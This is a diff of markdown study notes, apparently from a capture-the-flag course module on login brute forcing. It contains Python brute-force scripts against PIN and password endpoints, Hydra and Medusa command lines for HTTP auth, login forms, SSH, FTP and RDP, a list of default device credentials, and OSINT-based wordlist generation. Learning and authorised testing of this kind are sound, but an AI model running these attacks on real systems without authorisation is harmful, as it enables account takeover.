@@ -1,75 +1,97 @@
 # Login Brute Forcing
 
-Brute forcing = trial-and-error against passwords/credentials/keys: generate a candidate → apply it → check success → repeat until access or give up. Success depends on password complexity, attacker compute, and defenses (lockouts, CAPTCHAs).
+## Introduction
 
-The method family:
+Trial-and-error method to crack passwords, credentials, or encryption keys by systematically trying every possible combination.
 
-- **Simple brute force** — every combination in a charset/length range. Use when you know nothing and have compute to burn.
-- **Dictionary attack** — pre-compiled wordlist of likely passwords. Weak/common passwords.
-- **Hybrid** — dictionary words mutated with appended/prepended chars, years, symbols. Slightly-modified common passwords (the `Summer2023` → `Summer2023!` pattern).
-- **Credential stuffing** — leaked creds from one service replayed elsewhere, banking on reuse.
-- **Password spraying** — few common passwords against many usernames, spreading attempts to dodge lockouts.
-- **Reverse brute force** — one password against many usernames.
-- **Rainbow tables** — precomputed hash tables for fast reversal of many hashes.
-- **Distributed brute force** — the workload across a cluster.
+Success depends on password complexity, attacker computational power, and defenses in place (account lockouts, CAPTCHAs).
 
-In a pentest, brute forcing is the move when other avenues are exhausted, password policy is weak, or a specific (privileged) account is the target.
+### Types of Brute Forcing
+
+`Simple Brute Force` all combinations within a set/length | `Dictionary Attack` pre-compiled wordlist of common passwords | `Hybrid Attack` dictionary words with appended/prepended chars | `Credential Stuffing` reuses leaked creds across services | `Password Spraying` few common passwords against many usernames, avoids lockouts | `Rainbow Table` precomputed hash tables to reverse hashes | `Reverse Brute Force` one password against many usernames | `Distributed Brute Force` workload split across multiple machines
 
 ## Password Security Fundamentals
 
-Search-space math: `combinations = charset_size^length`. 6 lowercase = 26^6 ≈ 300M; 8 lowercase ≈ 200B; 8 mixed-case = 52^8 ≈ 53T; 12 full-ASCII = 94^12 ≈ 4.7×10^23. Length beats everything — each extra character multiplies the space.
+Password strength (length, complexity, uniqueness, randomness) determines resistance to brute-forcing.
 
-Strong password anatomy (NIST-flavored): length first (12+ minimum, passphrases favored over pure complexity), complexity still expands the per-character pool, uniqueness per account, randomness (no dictionary words, personal info, `qwerty`/`123456`/`p@ssw0rd` patterns). Policies (min length, complexity, expiry, history) can backfire into written-down passwords and `Winter24!`-style increments.
+### The Anatomy of a Strong Password
 
-**Default credentials are the low-hanging fruit.** A few from the module's table: Linksys/D-Link/TP-Link/Asus routers `admin:admin`, Netgear/Belkin `admin:password`, Cisco `cisco:cisco`, Zyxel `admin:1234`, Hikvision DVR `admin:12345`, Axis cameras `root:pass`, UniFi APs `ubnt:ubnt`, Canon printers `admin:admin`, Honeywell thermostat `admin:1234`. Default usernames (admin/root/user) alone shrink the attack space — half the battle is the username. SecLists keeps `top-usernames-shortlist.txt`.
+NIST: minimum 12 characters, mix of character types, unique per account, random (no dictionary words or personal info).
 
-Password posture drives tool selection, resource estimates, and where the weak points are.
+### Common Password Weaknesses
+
+Short (<8 chars), dictionary words/names, personal info (birthdates, pet names), reused across accounts, predictable patterns (`qwerty`, `123456`, `p@ssw0rd`).
+
+### The Perils of Default Credentials
+
+Default credentials are often simple and well known, giving an easy entry point.
+
+`Linksys` admin/admin | `D-Link` admin/admin | `Netgear` admin/password | `TP-Link` admin/admin | `Cisco` cisco/cisco | `Asus` admin/admin | `Belkin` admin/password | `Zyxel` admin/1234 | `Samsung SmartCam` admin/4321 | `Hikvision DVR` admin/12345 | `Axis IP Camera` root/pass | `Ubiquiti UniFi AP` ubnt/ubnt | `Canon Printer` admin/admin | `Honeywell Thermostat` admin/1234 | `Panasonic DVR` admin/12345
+
+Default usernames narrow the attack surface even after passwords are changed. Common usernames list: `top-usernames-shortlist.txt` (SecLists).
 
 ## Brute Force Attacks
 
-Pure enumeration against a live endpoint. Module demo — a `/pin` endpoint taking a 4-digit PIN:
+Math behind brute-force difficulty: password length and character set size determine total combinations and cracking time.
+
+`Possible Combinations = Character Set Size ^ Password Length`
+
+`6 lowercase` 26^6 ≈ 309M | `8 lowercase` 26^8 ≈ 209B | `8 upper+lower` 52^8 ≈ 53.5T | `12 full charset (94)` 94^12 ≈ 4.76×10^23
+
+`1M pw/s` 8-char alnum ≈ 6.92 yrs | `1T pw/s` 12-char full ASCII ≈ 15,000 yrs
+
+### Cracking the PIN
+
+Demo: brute-force a 4-digit PIN endpoint via HTTP GET requests.
 
 ```python
 import requests
 
-ip = "127.0.0.1"
-port = 1234
+ip = "<TARGET_IP>"  # Change this to your instance IP address
+port = <PORT>       # Change this to your instance port number
 
+# Try every possible 4-digit PIN (from 0000 to 9999)
 for pin in range(10000):
-    formatted_pin = f"{pin:04d}"
+    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
+    print(f"Attempted PIN: {formatted_pin}")
+
+    # Send the request to the server
     response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
-    if response.ok and 'flag' in response.json():
+
+    # Check if the server responds with success and the flag is found
+    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
         print(f"Correct PIN found: {formatted_pin}")
         print(f"Flag: {response.json()['flag']}")
         break
 ```
 
-10,000 max attempts for a 4-digit space — pure brute force is viable exactly when the space is small.
-
 ## Dictionary Attacks
 
-Exploits human predictability: memorable over secure. Wordlist quality decides success — tailor it to the target (gaming terms for gamers, company name + employee names + industry jargon for a corporate portal). Wordlist sources: public lists (SecLists), custom builds from recon, industry/company-specialized lists, pre-packaged lists on pentest distros (rockyou.txt on Parrot).
+Tests a pre-compiled wordlist of likely passwords instead of trying all combinations. Faster against weak or common passwords.
 
-Useful lists:
+`rockyou.txt` leaked passwords (RockYou breach) | `top-usernames-shortlist.txt` common usernames | `xato-net-10-million-usernames.txt` large username list | `2023-200_most_used_passwords.txt` top 200 passwords of 2023 | `Default-Credentials/default-passwords.txt` default device/router creds
 
-- `rockyou.txt` — millions of leaked RockYou passwords; the default password dictionary.
-- `top-usernames-shortlist.txt` — quick username attempts.
-- `xato-net-10-million-usernames.txt` — thorough username brute forcing.
-- `2023-200_most_used_passwords.txt` — current common passwords.
-- `Default-Credentials/default-passwords.txt` — router/software/device defaults.
+### Throwing a dictionary at the problem
 
-Dictionary attack demo (fetches its own list and POSTs each candidate):
+PoC: brute-force a password-only login endpoint using a downloaded wordlist.
 
 ```python
 import requests
 
-ip = "127.0.0.1"
-port = 1234
+ip = "<TARGET_IP>"  # Change this to your instance IP address
+port = <PORT>       # Change this to your instance port number
 
+# Download a list of common passwords from the web and split it into lines
 passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
 
+# Try each password from the list
 for password in passwords:
+    print(f"Attempted password: {password}")
+
+    # Send a POST request to the server with the password
     response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+
+    # Check if the server responds with success and contains the 'flag'
     if response.ok and 'flag' in response.json():
         print(f"Correct password found: {password}")
         print(f"Flag: {response.json()['flag']}")
@@ -78,172 +100,240 @@ for password in passwords:
 
 ## Hybrid Attacks
 
-Password-expiry policies breed predictable mutations (`Summer2023` → `Summer2023!` → `Summer2024`). Hybrid = dictionary pass first for low-hanging fruit, then targeted brute force on the dictionary words (append digits/symbols, increment years) — far smaller space than raw brute force, far wider coverage than plain dictionary.
+Combines dictionary and brute force: mutates wordlist entries (append/prepend numbers, symbols, years) to match predictable password changes.
 
-**Policy-filtering a wordlist with grep chains** — take only candidates that could pass the target's policy. For min length 8 + uppercase + lowercase + digit on `darkweb2017_top-10000.txt`:
+Filter a wordlist to match a password policy (example: min 8 chars, upper+lower+digit) using chained grep.
 
 ```bash
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
-grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
-grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
-grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
-grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
-wc -l darkweb2017-number.txt     # 89 candidates from 10,000
+grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt # min length 8
+grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt # require uppercase
+grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt # require lowercase
+grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt # require digit
 ```
-
-**Credential stuffing**: acquire leaked username/password pairs (breaches, phishing, or wordlists as a starting point), pick targets where those users likely have accounts, replay at scale while mimicking normal behavior. Powered entirely by password reuse — one breach, domino effect. (Fix: unique passwords + MFA.)
 
 ## Hydra
 
-Fast, parallel, modular network login cracker — web apps, SSH, FTP, databases, and more.
+Fast, parallel network login cracker supporting many protocols (SSH, FTP, HTTP, databases, RDP, etc.).
 
-```text
+```bash
+sudo apt-get -y update
+sudo apt-get -y install hydra
+```
+
+```bash
 hydra [login_options] [password_options] [attack_options] [service_options]
 ```
 
-- `-l LOGIN` / `-L FILE` — single username / username list
-- `-p PASS` / `-P FILE` — single password / password list
-- `-t TASKS` — parallel threads; `-f` — stop on first success
-- `-s PORT` — non-default port; `-v`/`-V` — verbosity
-- `-M FILE` — target list (multiple hosts)
-- `-x min:max:charset` — brute-force generation mode (e.g. `-x 6:8:abc...XYZ0123456789`)
+`-l LOGIN`/`-L FILE` single/list username | `-p PASS`/`-P FILE` single/list password | `-t TASKS` parallel tasks | `-f` stop after first success | `-s PORT` non-default port | `-v`/`-V` verbose/more verbose
 
-Service modules: `ftp`, `ssh`, `http-get`/`http-post-form`, `smtp`, `pop3`, `imap`, `mysql`, `mssql`, `vnc`, `rdp`.
+`ftp` FTP login | `ssh` SSH login | `http-get`/`http-post-form` HTTP auth/login forms | `smtp` mail submission login | `pop3` mail retrieval login | `imap` mail access login | `mysql` MySQL DB login | `mssql` MSSQL DB login | `vnc` remote desktop login | `rdp` RDP login
 
-Patterns:
+### Brute-Forcing HTTP Authentication
 
 ```bash
-hydra -L usernames.txt -P passwords.txt www.example.com http-get         # basic auth
-hydra -l root -p toor -M targets.txt ssh                                # same creds, many hosts
-hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp   # non-standard port
-hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp   # generated charset
+hydra -L <USERLIST> -P <WORDLIST> <TARGET_DOMAIN> http-get
+```
+
+### Targeting Multiple SSH Servers
+
+Same credential pair against a list of target hosts.
+
+```bash
+hydra -l root -p toor -M <TARGET_FILE> ssh # -M target list file
+```
+
+### Testing FTP Credentials on a Non-Standard Port
+
+```bash
+hydra -L <USERLIST> -P <WORDLIST> -s <PORT> -V <TARGET_DOMAIN> ftp
+```
+
+### Brute-Forcing a Web Login Form
+
+```bash
+hydra -l <USERNAME> -P <WORDLIST> <TARGET_DOMAIN> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+
+### Advanced RDP Brute-Forcing
+
+```bash
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <TARGET_IP> rdp # -x min:max:charset bruteforce
 ```
 
 ## Basic HTTP Authentication
 
-Basic Auth flow: server answers 401 + `WWW-Authenticate` → browser prompts → credentials sent as `Authorization: Basic <base64(user:pass)>` on every request. Base64 is encoding, not encryption — and the scheme is a classic brute-force target.
+Challenge-response scheme: server sends 401 + WWW-Authenticate, client sends base64(user:pass) in the Authorization header.
 
 ```http
 GET /protected_resource HTTP/1.1
-Host: www.example.com
-Authorization: Basic YWxpY2U6c2VjcmV0MTIz
+Host: <TARGET_DOMAIN>
+Authorization: Basic <BASE64_CREDENTIALS>
 ```
 
-Hydra against it (username known, so only the password list):
+### Exploiting Basic Auth with Hydra
 
 ```bash
-hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
+hydra -l <USERNAME> -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>
 ```
-
-`http-get` module, path `/`, `-s 81` for the non-standard port. Output line: `[81][http-get] host: ... login: basic-auth-user password: ...`.
 
 ## Login Forms
 
-Custom login forms POST credentials as form data (`application/x-www-form-urlencoded`, body like `username=john&password=secret123`). Hydra's `http-post-form` automates them:
+Custom HTML forms submit credentials via POST. Common brute-force target beyond Basic Auth.
 
-```text
-hydra [options] target http-post-form "path:params:condition_string"
-```
+### http-post-form
 
-**Condition string** — how Hydra judges each attempt:
-
-- `F=...` — failure string in the response (most common; e.g. `F=Invalid credentials`)
-- `S=...` — success signal: status code (`S=302` redirect after login) or content (`S=Dashboard`, `S=Welcome`)
-
-Build the params string from recon: inspect the form HTML for field names and method; F12 → Network tab to watch a real POST (path + parameters + response); Burp/ZAP interception for complex cases (hidden fields, CSRF tokens — static or dynamic values must be included in the params string).
-
-Module walkthrough — form posts `username`/`password` to `/`, failure shows "Invalid credentials":
+Hydra module for POST-based login forms.
 
 ```bash
-hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <IP> -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+hydra [options] <TARGET_DOMAIN> http-post-form "path:params:condition_string"
 ```
 
-`^USER^`/`^PASS^` are the wordlist placeholders; `-f` stops at the first valid pair.
+### Understanding the Condition String
+
+`F=` failure match text | `S=` success match (status code or text)
+
+```bash
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" # match failure text
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302" # match success status
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard" # match success text
+```
+
+### Manual Inspection
+
+Browser dev tools: inspect form HTML for method and field names.
+
+### Browser Developer Tools
+
+Network tab captures the POST request: form data, headers, response.
+
+### Proxy Interception
+
+Burp Suite or OWASP ZAP intercepts traffic for complex multi-step forms.
+
+### Constructing the params String for Hydra
+
+```bash
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <TARGET_IP> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+```
 
 ## Medusa
 
-Alternative parallel login bruyte-forcer — same job, different syntax:
+Fast, massively parallel, modular login brute-forcer supporting many services.
 
-```text
+```bash
+sudo apt-get -y update
+sudo apt-get -y install medusa
+```
+
+```bash
 medusa [target_options] [credential_options] -M module [module_options]
 ```
 
-- `-h HOST` / `-H FILE` — target / target list; `-u` / `-U`, `-p` / `-P` — creds/lists
-- `-M module` — ftp, http, imap, mysql, pop3, rdp, ssh, svn, telnet, vnc, web-form...
-- `-m "OPTION"` — module-specific options
-- `-t TASKS`; `-f`/`-F` — fast mode (current host / any host); `-n PORT`; `-v LEVEL` (up to 6)
-- `-e ns` — extra checks: empty passwords (`n`) and password = username (`s`)
+`-h HOST`/`-H FILE` single/list target | `-u USER`/`-U FILE` single/list username | `-p PASS`/`-P FILE` single/list password | `-M MODULE` module to use | `-m "OPT"` module-specific options | `-t TASKS` parallel attempts | `-f`/`-F` stop after first success (host/any) | `-n PORT` non-default port | `-v LEVEL` verbosity (1-6)
 
-Patterns:
+`ftp` FTP login | `http` HTTP GET/POST form login | `imap` mail access login | `mysql` MySQL DB login | `pop3` mail retrieval login | `rdp` RDP login | `ssh` SSHv2 login | `svn` Subversion repo login | `telnet` Telnet login | `vnc` remote desktop login | `web-form` HTTP POST form login
+
+### Targeting an SSH Server
 
 ```bash
-medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
-medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET     # basic auth across hosts
-medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name                     # empty + same-as-user passwords
+medusa -h <TARGET_IP> -U <USERLIST> -P <WORDLIST> -M ssh
 ```
+
+### Targeting Multiple Web Servers with Basic HTTP Authentication
+
+```bash
+medusa -H <TARGET_FILE> -U <USERLIST> -P <WORDLIST> -M http -m GET
+```
+
+### Testing for Empty or Default Passwords
+
+```bash
+medusa -h <TARGET_IP> -U <USERLIST> -e ns -M <MODULE>
+```
+
+`-e n` empty password | `-e s` password equals username
 
 ## Web Services
 
-Module's SSH → FTP chain:
+SSH: encrypted remote access, default port 22. FTP: file transfer, cleartext credentials. Both vulnerable to weak-password brute force.
+
+### Kick-off
+
+Brute-force SSH with a known username.
 
 ```bash
-medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
-# ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: ... [SUCCESS]
-
-ssh sshuser@<IP> -p <PORT>
+medusa -h <TARGET_IP> -n <PORT> -u <USERNAME> -P 2023-200_most_used_passwords.txt -M ssh -t 3
 ```
 
-Inside the shell, pivot discovery:
-
 ```bash
-netstat -tulpn | grep LISTEN     # port 21 listening
-nmap localhost                   # confirms ftp
+ssh <USERNAME>@<TARGET_IP> -p <PORT>
 ```
 
-Username intel from the filesystem (`/home/ftpuser` → likely FTP user `ftpuser`), then the local attack (127.0.0.1 so Medusa uses IPv4 explicitly):
+### Expanding the Attack Surface
+
+After SSH access, enumerate other listening services.
 
 ```bash
-medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+netstat -tulpn | grep LISTEN
+nmap localhost
 ```
 
-Collect the flag:
+`-t` tcp | `-u` udp | `-l` listening | `-p` show pid/program | `-n` numeric (no DNS)
+
+### Targeting the FTP Server
+
+Username guessed from `/home` directory listing.
 
 ```bash
-ftp ftp://ftpuser:<PASSWORD>@localhost
-ftp> get flag.txt
+medusa -h 127.0.0.1 -u <USERNAME_2> -P 2020-200_most_used_passwords.txt -M ftp -t 5
+```
+
+127.0.0.1 forces Medusa to use IPv4.
+
+### Retrieving The Flag
+
+```bash
+ftp ftp://<USERNAME_2>:<PASSWORD>@localhost
+```
+
+```text
+ftp> get <FILE>
 ```
 
 ## Custom Wordlists
 
-Generic lists waste time against a specific person — "Thomas Edison" isn't in xato-10M under his company's naming convention. Custom lists from recon (social media, company sites, public records, news) shrink the space dramatically.
+Tailored wordlists built from OSINT on a specific target increase brute-force efficiency versus generic lists like rockyou or SecLists.
 
-**Username Anarchy** — generate every plausible username permutation for a name:
+### Username Anarchy
+
+Generates username permutations (initials, substitutions, concatenations) from a target's name.
 
 ```bash
 sudo apt install ruby -y
-git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy
-./username-anarchy -l                        # list formats: first, firstlast, first.last, flast, f.last, lfirst, lastf, firstlast[8], first1, fmlast, FLast, ...
-./username-anarchy Jane Smith > jane_smith_usernames.txt
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+./username-anarchy <FIRST_NAME> <LAST_NAME> > <OUTPUT_FILE>
 ```
 
-**CUPP** (Common User Passwords Profiler) — interactive personalized password list from the target's life:
+### CUPP
+
+Generates a personalized password wordlist from OSINT profile data (name, dates, pets, employer, interests).
 
 ```bash
+sudo apt install cupp -y
 cupp -i
 ```
 
-Feed it name, nickname, birthdate, partner (name/nickname/birthdate), child, pet, company, keywords, then choose special chars / random numbers / leet mode. From a Jane Smith OSINT profile it produces ~46k candidates: capitalized and reversed strings, birthdate concatenations, appended digits/symbols, leetspeak (`j4n3`, `5m1th`), combined mutations (`Jane1994!`).
-
-Filter the CUPP output against the target's password policy (min 6, upper + lower + digit + two specials from `!@#$%^&*`):
+Filter CUPP output for a policy: min 6 chars, upper+lower+digit, 2+ special chars from `!@#$%^&*`.
 
 ```bash
-grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+grep -E '^.{6,}$' <WORDLIST> | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > <OUTPUT_FILE>
 ```
-
-~46k → ~7.9k. Fire both lists at the login form:
 
 ```bash
-hydra -L jane_smith_usernames.txt -P jane-filtered.txt <IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+hydra -L <USERLIST> -P <WORDLIST> <TARGET_IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 ```
-
-Username list + targeted password list + policy filter + Hydra = the module's full workflow.
